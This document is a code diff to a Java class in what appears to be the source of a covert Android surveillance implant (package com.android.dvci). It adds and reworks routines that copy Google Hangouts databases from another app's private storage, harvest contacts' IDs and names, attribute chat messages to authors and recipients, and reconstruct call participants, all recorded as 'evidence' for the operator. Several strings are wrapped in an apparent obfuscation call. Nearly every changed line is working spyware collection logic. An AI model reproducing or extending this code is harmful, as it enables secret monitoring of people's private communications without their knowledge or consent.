@@ -3,6 +3,7 @@ package com.android.dvci.module.chat;
 import android.database.Cursor;
 
 import com.android.dvci.auto.Cfg;
+import com.android.dvci.crypto.Digest;
 import com.android.dvci.db.GenericSqliteHelper;
 import com.android.dvci.db.RecordVisitor;
 import com.android.dvci.file.AutoFile;
@@ -50,6 +51,7 @@ public class ChatGoogle extends SubModuleChat {
 	public static final String DB_CHAT_DIR = M.e("/data/data/com.google.android.talk/databases");
 	public static final String DB_TALKFILE = M.e("talk.db");
 	public static final String DB_TALK_DIR = M.e("/data/data/com.google.android.gsf/databases");
+	public static final String ADDRESS_SUFFIX = M.e("-addresses");
 	private static LinkedHashMap<String, String> db2id = new LinkedHashMap<String, String>();
 
 	/**
@@ -147,12 +149,17 @@ public class ChatGoogle extends SubModuleChat {
 						if (account != null) {
 							if( account.isGaiaValid()) {
 								ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.HANGOUT, account.getGaiaId(), account.getAccountDisplayName());
+								// Save contacts if AddressBook is active for valid db
+								if (ManagerModule.self().isInstancedAgent(ModuleAddressBook.class)) {
+									saveHangOutContacts( db, lastlines,account.getGaiaId());
+								}
 							}
 							if ( account.hasMail()){
 								ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.GOOGLE, account.getAccountMail(), account.getAccountDisplayName());
 							}
 							lastLine = readHangoutMessages(lastLine, db, account.getAccountDisplayName());
 							lastlines.put(db, lastLine);
+
 						}
 					}
 				}
@@ -161,6 +168,64 @@ public class ChatGoogle extends SubModuleChat {
 		} finally {
 			readBabelSemaphore.release();
 		}
+	}
+
+	private void saveHangOutContacts(String dbName, LinkedHashMap<String, Long> lastlines, String owner_gaia_id) {
+		String dbName_addr = dbName+ADDRESS_SUFFIX;
+		GenericSqliteHelper helper = GenericSqliteHelper.openCopy(DB_CHAT_DIR, dbName);
+		if (helper == null ) {
+			return ;
+		}
+		long lastline = 0;
+		if(lastlines.containsKey(dbName_addr)) {
+			Long ll = lastlines.get(dbName_addr);
+			if (ll != null) {
+				lastline = ll.longValue();
+			}
+		}
+
+		// transport_typ == 3 indicates sms , so skips it
+		String sql_m = String.format(M.e("select gaia_id, full_name, fallback_name, first_name, _id ") +
+						M.e("from participants where gaia_id not null and gaia_id!='%s' and full_name not null and  _id>%d"),
+				owner_gaia_id, lastline);
+
+		RecordVisitor visitor = new RecordVisitor() {
+
+			@Override
+			public long cursor(Cursor cursor) {
+				// I read a line in a conversation.
+				String contact_gaia_id = cursor.getString(0);
+				String fullName = cursor.getString(1);
+				String fall = cursor.getString(2);
+				String first_name = cursor.getString(3);
+				int id = cursor.getInt(4);
+				if(StringUtils.isEmpty(fullName)){
+					fullName = fall;
+				}
+				if (!StringUtils.isEmpty(contact_gaia_id) && !StringUtils.isEmpty(fullName)) {
+					Contact c = new Contact(contact_gaia_id,contact_gaia_id ,fullName, "");
+					Long gaia_id = null;
+					try {
+						gaia_id =  Long.parseLong(contact_gaia_id);
+					} catch (NumberFormatException ex) {
+						gaia_id = Digest.CRC32(contact_gaia_id.getBytes());
+					}
+						if (!ModuleAddressBook.createEvidenceRemoteFull(ModuleAddressBook.HANGOUT, gaia_id, fullName, "", "", contact_gaia_id)) {
+							if (Cfg.DEBUG) {
+								Check.log(TAG + " (saveHangOutContacts): failure saving contacts="+c);
+							}
+							return id;
+						}
+				}
+				return id;
+			}
+		};
+
+		long newLastId = helper.traverseRawQuery(sql_m, new String[]{}, visitor);
+		if(newLastId>lastline){
+			lastlines.put(dbName_addr, newLastId);
+		}
+
 	}
 
 	private void serializeMarkup(LinkedHashMap<String,Long> lastLines) {
@@ -178,15 +243,6 @@ public class ChatGoogle extends SubModuleChat {
 
 	private long readHangoutMessages(long lastLines, String dbFile, String account) {
 
-
-		//if (ManagerModule.self().isInstancedAgent(ModuleAddressBook.class)) {
-		//	saveContacts(helper);
-		//}
-
-		String sql_c = M.e("select cp.conversation_id, latest_message_timestamp, full_name, latest_message_timestamp from conversations as c ") +
-				M.e("join conversation_participants as cp on c.conversation_id=cp.conversation_id join participants as p on  cp.participant_row_id=p._id");
-
-		// babel
 		GenericSqliteHelper helper = GenericSqliteHelper.openCopy(DB_CHAT_DIR, dbFile);
 		if (helper == null) {
 			return lastLines;
@@ -204,7 +260,7 @@ public class ChatGoogle extends SubModuleChat {
 
 				// retrieves the lastConvId recorded as evidence for this
 				// conversation
-				if (sc.isGroup() && !groups.hasMemoizedGroup(sc.id)) {
+				if ( !groups.hasMemoizedGroup(sc.id)) {
 					fetchHangoutParticipants(helper, account, sc.id, groups);
 					//groups.addPeerToGroup(sc.id, account);
 				}
@@ -225,8 +281,8 @@ public class ChatGoogle extends SubModuleChat {
 	private long fetchHangoutMessages(GenericSqliteHelper helper, final HangoutConversation conversation, final ChatGroups groups, long lastTimestamp) {
 		final ArrayList<MessageChat> messages = new ArrayList<MessageChat>();
 		// transport_typ == 3 indicates sms , so skips it
-		String sql_m = String.format(M.e("select m._id, full_name, fallback_name ,text, timestamp, type, p.chat_id ") +
-						M.e("from messages as m join participants as p on m.author_chat_id = p.chat_id where transport_type!=3 and type<3 and conversation_id='%s' and timestamp>%s"),
+		String sql_m = String.format(M.e("select m.author_gaia_id, full_name, fallback_name ,text, timestamp, type, p.chat_id ") +
+						M.e("from messages as m join participants as p on m.author_gaia_id = p.gaia_id where transport_type!=3 and type<3 and conversation_id='%s' and timestamp>%s"),
 				conversation.id, lastTimestamp);
 
 		RecordVisitor visitor = new RecordVisitor() {
@@ -234,16 +290,15 @@ public class ChatGoogle extends SubModuleChat {
 			@Override
 			public long cursor(Cursor cursor) {
 				// I read a line in a conversation.
-				int id = cursor.getInt(0);
+				String author_gaia_id = cursor.getString(0);
 				String fullName = cursor.getString(1);
-				String fallback_name = cursor.getString(2);
+				String peer = cursor.getString(2);
 				String body = cursor.getString(3);
 				long timestamp = cursor.getLong(4);
 
 				boolean incoming = cursor.getInt(5) == 2;
-				String chat_id = cursor.getString(6);
 
-				String peer = fullName;
+
 				//if (fallback_name!=null)
 				//	peer = fallback_name;
 
@@ -264,21 +319,11 @@ public class ChatGoogle extends SubModuleChat {
 				String from, to = null;
 				String fromDisplay, toDisplay = null;
 
-				from = incoming ? peer : conversation.account;
-				fromDisplay = incoming ? peer : conversation.account;
+				from = author_gaia_id;
+				fromDisplay = groups.getContact(author_gaia_id).name;
 
-				Contact contact = groups.getContact(peer);
-
-				if (isGroup) {
-					// if (peer.equals("0")) {
-					// peer = conversation.account;
-					// }
-					to = groups.getGroupToName(from, conversation.id);
-					toDisplay = to;
-				} else {
-					to = incoming ? conversation.account : conversation.remote;
-					toDisplay = incoming ? conversation.account : conversation.remote;
-				}
+				to = groups.getGroupToId(fromDisplay, conversation.id);
+				toDisplay =  groups.getGroupToName(fromDisplay, conversation.id);
 
 				if (!StringUtils.isEmpty(body)) {
 					MessageChat message = new MessageChat(PROGRAM_HANGOUT, date, from, fromDisplay, to, toDisplay,
@@ -339,7 +384,7 @@ public class ChatGoogle extends SubModuleChat {
 			}
 		};
 
-		String sqlquery = M.e("select  p.chat_id, full_name, fallback_name, cp.conversation_id from conversation_participants as cp join participants as p on  cp.participant_row_id=p._id where conversation_id=?");
+		String sqlquery = M.e("select  p.gaia_id, full_name, fallback_name, cp.conversation_id from conversation_participants as cp join participants as p on  cp.participant_row_id=p._id where conversation_id=?");
 		helper.traverseRawQuery(sqlquery, new String[]{thread_id}, visitor);
 	}
 
@@ -347,7 +392,7 @@ public class ChatGoogle extends SubModuleChat {
 		final List<HangoutConversation> conversations = new ArrayList<HangoutConversation>();
 
 		String[] projection = new String[]{M.e("conversation_id"), M.e("latest_message_timestamp"), M.e("conversation_type"), M.e("generated_name")};
-		String selection = "latest_message_timestamp > " + timestamp;
+		String selection = "transport_type!=3 and latest_message_timestamp > " + timestamp; //exclude sms transport_type!=3
 
 		RecordVisitor visitor = new RecordVisitor(projection, selection) {
 
@@ -757,13 +802,13 @@ public class ChatGoogle extends SubModuleChat {
 	 */
 
 	public static LinkedHashMap<Integer, GtalkEntity> getParticipants(GenericSqliteHelper helper, String participants) {
-		final LinkedHashMap<Integer, GtalkEntity> res = new LinkedHashMap<Integer, GtalkEntity>();
+		final LinkedHashMap<Integer, GtalkEntity> _res = new LinkedHashMap<Integer, GtalkEntity>();
 		String filter = "";
 		if (helper == null || participants == null || participants.contentEquals("")) {
 			if(Cfg.DEBUG) {
 				Check.log(TAG +  " (getCurrentCall): ERROR invalid parameters");
 			}
-			return res;
+			return _res;
 		}
 
 
@@ -797,7 +842,7 @@ public class ChatGoogle extends SubModuleChat {
 				int id = cursor.getInt(0);
 				String name = cursor.getString(1);
 				String gtalk_id = cursor.getString(4);
-				res.put(id, new GtalkEntity(gtalk_id, id, name));
+				_res.put(id, new GtalkEntity(gtalk_id, id, name));
 				return id;
 			}
 		};
@@ -806,27 +851,43 @@ public class ChatGoogle extends SubModuleChat {
 		}finally {
 			helper.disposeDb();
 		}
-
+		// reorder the list as for participants parameter
+		LinkedHashMap<Integer, GtalkEntity> res = new LinkedHashMap<Integer, GtalkEntity>();
+		for (String id : p) {
+			try {
+				res.put(Integer.parseInt(id),_res.get(Integer.parseInt(id)));
+			}catch (Exception e){
+				if (Cfg.DEBUG) {
+					Check.log(TAG +  " (getCurrentCall): ERROR converting int " + id);
+				}
+			}
+		}
 		return res;
 	}
 
 	public static boolean getCurrentCall(final CallInfo callInfo) {
+		if(callInfo == null){
+			return false;
+		}
+		String dbFile = getActiveDb(); // getActiveDb also fill owner
+		GtalkEntity tmp = getAccount(dbFile);
 
-		String dbFile = getActiveDb();
+		String local_gaia = tmp.getGaiaId();
+		final String[] participants = new String[1];
+		callInfo.account = tmp.getPhone();
 		String sqlquery = M.e("select m.timestamp, m.author_chat_id, m.participant_keys, m.type from messages as m where m.type = 8 and m.timestamp not null order by m.timestamp desc limit 1");
 		RecordVisitor visitor = new RecordVisitor() {
 
 			@Override
 			public long cursor(Cursor cursor) {
 				long createTime = cursor.getLong(0);
-				// use account as temporary variable
-				callInfo.account = cursor.getString(1);
+
 				callInfo.timestamp = new Date(createTime);
 				if(Cfg.DEBUG) {
 					Check.log(TAG +  " (getCurrentCall): timestamp=" + createTime);
 				}
 				callInfo.valid = true;
-				callInfo.peer = cursor.getString(2);
+				participants[0] = cursor.getString(2);
 				return createTime;
 			}
 		};
@@ -838,8 +899,8 @@ public class ChatGoogle extends SubModuleChat {
 		try {
 			helper.traverseRawQuery(sqlquery, new String[]{}, visitor);
 			if (callInfo.valid) {
-				LinkedHashMap<Integer, GtalkEntity> peers = getParticipants(helper, callInfo.peer);
-				if (peers.size() > 1) {
+				LinkedHashMap<Integer, GtalkEntity> peers = getParticipants(helper, participants[0]);
+				if (peers.size() >= 1) {
 					callInfo.peer = "";
 					boolean first = true;
 					for (GtalkEntity p : peers.values()) {
@@ -847,18 +908,18 @@ public class ChatGoogle extends SubModuleChat {
 						 /* first participant on the list is the caller, so if the caller is the account
 						  * tha call is outgoing
 						  */
-							if (p.gtalk_id_str.contentEquals(callInfo.account)) {
+							if (p.gtalk_id_str.contentEquals(local_gaia)) {
 								callInfo.incoming = false;
 							} else {
 								callInfo.incoming = true;
 							}
 
 							first = false;
-						} else {
-							if (!p.gtalk_id_str.contentEquals(callInfo.account)) {
-								callInfo.peer += p.displayName + ",";
-							}
 						}
+						if (!p.gtalk_id_str.contentEquals(local_gaia)) {
+							callInfo.peer += p.displayName + ",";
+						}
+
 					}
 				} else {
 					callInfo.valid = false;
